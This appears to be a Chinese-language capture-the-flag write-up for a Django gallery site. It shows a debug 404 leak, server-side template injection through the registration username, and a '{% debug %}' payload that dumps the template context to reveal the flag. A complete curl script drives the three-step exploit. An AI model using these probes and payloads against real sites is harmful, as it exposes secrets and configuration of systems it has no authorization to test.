## 题解

### 入口与指纹

`WSGIServer/0.2 CPython/3.9.2`，Django 站点 **Art Gallery**（画廊 + 三步注册）。

**第一个关键信号：404 页是 Django 的调试页。**

```bash
curl http://$T/zzz
```

```html
<p>Using the URLconf defined in <code>ssti_debug_art_gallery.urls</code>,
   Django tried these URL patterns, in this order:</p>
<ol>
  <li>accounts/</li>
  <li>^static/(?P<path>.*)$</li>
</ol>
```

两个信息：

- `DEBUG = True`（生产环境不会显示这些）；
- 项目名叫 **`ssti_debug_art_gallery`** —— 题眼直接写在 URLconf 名里。

### 关键观察

**1. 注册流程分三步，第三步会把**用户名**塞进一段内联 JS。**

```
/accounts/register/step1/   name + password
/accounts/register/step2/   email
/accounts/register/step3/   is_premium 复选框
```

完成 step2 后，step3 页面末尾出现：

```html
<script>alert("Hello u25. Just Now up to 50% OFF ")</script>
```

**用户名被插进了 `alert("Hello …")` 里，而且它经过了 Django 模板渲染。**

**2. 用 `{{7|add:7}}` 确认是模板注入（不是简单拼接）。**

把注册名填成 `{{7|add:7}}`，走完 step1/step2，再看 step3：

```html
<script>alert("Hello 14. Just Now up to 50% OFF ")</script>
```

`{{7|add:7}}` 被求值成 `14` → **SSTI 成立**，引擎是 Django 模板
（注意 Django 不支持 `7*7`，必须用 `add` 过滤器）。

**3. `{% debug %}` 直接把上下文 dump 出来。**

```bash
name={% debug %}
```

step3 的响应从约 4 KB 涨到 **111 637 字节**，上下文里就有：

```text
{'flag': 'flag{5b91c9ea-1c91-433a-82bb-9cebbadb7e71}'}
```

### 利用链

```bash
T=$(head -1 .target)
c=$(mktemp)

# step1: 用 {% debug %} 当名字
curl -sS -c $c -b $c "http://$T/accounts/register/step1/" -o /tmp/s1
tok=$(grep -o 'csrfmiddlewaretoken" value="[^"]*"' /tmp/s1 | head -1 | sed 's/.*value="//;s/"//')
curl -sS -c $c -b $c --data-urlencode 'name={% debug %}' \
     --data-urlencode 'password=passw0rd123' \
     -d "csrfmiddlewaretoken=$tok" "http://$T/accounts/register/step1/"

# step2: 邮箱
curl -sS -c $c -b $c "http://$T/accounts/register/step2/" -o /tmp/s2
tok2=$(grep -o 'csrfmiddlewaretoken" value="[^"]*"' /tmp/s2 | head -1 | sed 's/.*value="//;s/"//')
curl -sS -c $c -b $c -d "csrfmiddlewaretoken=$tok2&email=u1@example.com" \
     "http://$T/accounts/register/step2/"

# step3: 渲染，flag 出现在 dump 里
curl -sS -c $c -b $c "http://$T/accounts/register/step3/" | grep -o 'flag{[^}]*}'
```

### flag 位置

step3 页面的模板上下文（`{'flag': 'flag{...}'}`），经 `{% debug %}` 输出到页面上。

## 复盘

- **404 页是免费的源码/配置泄露。** `Using the URLconf defined in ssti_debug_art_gallery.urls`
  一句话同时给出了 `DEBUG=True` 和"这题考 SSTI"。遇到 Django/Flask 站点，先请求一个
  不存在的路径看 404 形态，成本 1 个请求。
- **注册/资料类表单是 SSTI 的高频入口。** 本题是"名字 → 内联 JS 里的模板"，
  看起来像普通字符串插值，实际走了模板渲染。判断方法就是用
  `{{7|add:7}}`（Django）或 `{{7*7}}`（Jinja2）各试一次。
- **Django 与 Jinja2 的探针不同。** Django 模板没有算术运算，`{{7*7}}` 会原样输出或被
  当成变量名；必须用过滤器 `{{7|add:7}}`。所以"`{{7*7}}` 没反应"不能直接判定无 SSTI。
- **`{% debug %}` 在 `DEBUG=True` 时是杀手锏。** 它不需要猜变量名，直接把上下文摊开；
  本题 flag 就是一个叫 `flag` 的上下文变量，一次 dump 就拿到。
- 补充：该站点还注册了 `is_premium` 复选框、`/accounts/preferences/` 显示
  "Premium Subscriber: True" 与"in process to access premium subscription"，
  看起来像另一条线（订阅校验），但 flag 在模板上下文里，不需要走那条路。
